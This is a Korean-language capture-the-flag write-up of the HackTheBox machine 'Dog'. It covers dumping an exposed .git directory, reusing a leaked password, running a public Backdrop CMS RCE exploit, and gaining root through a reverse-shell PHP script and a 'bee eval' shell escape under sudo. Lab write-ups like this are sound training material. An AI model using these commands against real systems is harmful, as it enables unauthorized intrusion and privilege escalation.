# Dog - HackTheBox
## Recon
```bash
sudo nmap -p 22,80 -sC -sV -vv -oA dog 10.10.11.5
```
<img width="1104" height="461" alt="image" src="https://github.com/user-attachments/assets/dae354a6-10ec-46ef-b7b8-482308c58870" />

- SSH(22)
- HTTP(80)

---
## HTTP
### banner grabbing
```bash
whatweb http://10.10.11.58

curl -IL http://10.10.11.58
```
<img width="1105" height="468" alt="image" src="https://github.com/user-attachments/assets/9f238656-d05d-4b56-b627-87deac8324cc" />

<br>
<br>

- `/etc/hosts`에 `dog.htb` 추가.
<img width="1100" height="369" alt="image" src="https://github.com/user-attachments/assets/eceb8531-6064-4a8e-a9e7-a0b417e2b714" />

<br>
<br>

- `Backdrop CMS`
<img width="290" height="130" alt="image" src="https://github.com/user-attachments/assets/f8cc929e-2031-49d7-a735-6b442460c0a3" />

### GIT
- `.git`을 `namp`으로 발견해서 `git-dumper`사용.
```bash
git-dumper http://10.10.11.58 git
```
<img width="1104" height="320" alt="image" src="https://github.com/user-attachments/assets/85828719-8577-49ea-ab71-610667938c8f" />

<br>
<br>

- `settings.php`에서 `mysql` 계정 정보 발견.(root:BackDropJ2024DS2024)
<img width="1104" height="355" alt="image" src="https://github.com/user-attachments/assets/4bd9fefe-d6e4-4698-ad7a-d3392e02b45f" />

<br>
<br>

- 서버에 `root:BackDropJ2024DS2024`로 로그인 시도했으나 실패.
- `email` 로그인도 가능해서 `grep`으로 `tiffany@dog.htb`발견.
```bash
grep -r '@dog.htb'
```
<img width="1104" height="189" alt="image" src="https://github.com/user-attachments/assets/255f1274-c1da-48d9-bda4-3cae623aaa0d" />

<br>
<br>

- `tiffany@dog.htb:BackDropJ2024DS2024` 로그인 성공.
<img width="1100" height="611" alt="image" src="https://github.com/user-attachments/assets/027f417b-f4c8-4f2d-a553-ada2aec5a690" />

<br>
<br>

### RCE
- https://github.com/rvizx/backdrop-rce
- 수동으로 POC를 진행하였으나 실패해서 스크립트를 사용.
```bash
python3 exploit.py http://10.10.11.58 tiffany@dog.htb BackDropJ2024DS2024
```
<img width="1104" height="337" alt="image" src="https://github.com/user-attachments/assets/78b09f7d-3baa-4526-b3e0-8082a6f48bd0" />

<br>
<br>

- 셸 획득.
<img width="1104" height="179" alt="image" src="https://github.com/user-attachments/assets/ac778ce2-e18e-4123-b80c-83c647403a05" />

## Privesc
- `/etc/passwd`에서 `johncusack`유저 발견.
```bash
cat /etc/passwd | grep sh$
```
<img width="1104" height="81" alt="image" src="https://github.com/user-attachments/assets/64cad013-116b-47eb-9958-5035206b96f6" />

<br>
<br>

- `johncusack:BackDropJ2024DS2024`로그인.
```bash
su johncusack
```
<img width="1104" height="136" alt="image" src="https://github.com/user-attachments/assets/d660b8bc-542d-4932-a744-f6098dd69f3e" />

<br>
<br>

- `/usr/local/bin/bee`를 `root`권한으로 실행 가능.
```bash
sudo -l
```
<img width="1104" height="136" alt="image" src="https://github.com/user-attachments/assets/7cff7bba-76df-4867-b599-5435fc7f6e05" />

<br>
<br>

- 프로그램을 `root`권한으로 실행시키면 옵션으로 `php-script`를 줄 수 있는 것을 확인.
```bash
sudo /usr/local/bin/bee
```
<img width="1103" height="324" alt="image" src="https://github.com/user-attachments/assets/710a6e99-b826-4377-999d-d95be22332ee" />

<br>
<br>

- `/tmp`폴더에서 해당 명령어를 실행하니 오류가 출력되어 `--root`의 출력을 읽어보니 `Backdrop CMS`의 설치 폴더에서 실행시켜야 하는 것으로 보임.
<img width="1103" height="101" alt="image" src="https://github.com/user-attachments/assets/af7eef51-dcc8-4bf5-b03c-8b6cc9b0aab4" />

<br>
<br>

- `/var/www/html`폴더로 이동하여 명령어를 실행하니 오류 출력이 사라짐.
```bash
sudo /usr/local/bin/bee php-script test.php
```
<img width="1103" height="73" alt="image" src="https://github.com/user-attachments/assets/db25eab1-616a-402d-8e36-2fc16ae0b568" />

<br>
<br>

<img width="1103" height="54" alt="image" src="https://github.com/user-attachments/assets/ef19276e-e167-47e4-94fe-9ccd7f0c1bca" />

<br>
<br>

- `/var/www/html`폴더에 `johncusack`유저가 파일을 만들 수 없어 `www-data`유저로 로컬로부터 리버스 셸 스크립트 다운로드.
```bash
cp /usr/share/webshells/php/php-reverse-shell.php .

mv php-reverse-shell.php ex.php
```
<img width="1103" height="211" alt="image" src="https://github.com/user-attachments/assets/f70c4a9c-3a18-4eb9-b807-1ca231ea94a7" />

<br>
<br>

- 리버스 셸 스크립트 실행.
```bash
sudo /usr/local/bin/bee php-script ex.php
```
<img width="1103" height="123" alt="image" src="https://github.com/user-attachments/assets/b47c90ad-b4c7-4815-b05d-a0d142f21c66" />

<br>
<br>

- 셸 획득.
<img width="1103" height="221" alt="image" src="https://github.com/user-attachments/assets/0a8d42e8-22b7-4888-9820-3f1eb17fe1e8" />


### 더 쉬운 방법
```bash
sudo /usr/local/bin/bee eval "system('/bin/bash')"
```
<img width="1103" height="60" alt="image" src="https://github.com/user-attachments/assets/7421175c-cceb-4999-a52d-408f50bc8027" />

---
## FLAG
- `/home/johncusack/user.txt`
<img width="1103" height="215" alt="image" src="https://github.com/user-attachments/assets/4e233e37-b222-4d74-ab96-5c84f8213bdc" />

<br>
<br>

- `/root/root.txt`
<img width="1103" height="290" alt="image" src="https://github.com/user-attachments/assets/94902290-7f0a-4b67-a7a1-3b52d1b54f74" />





















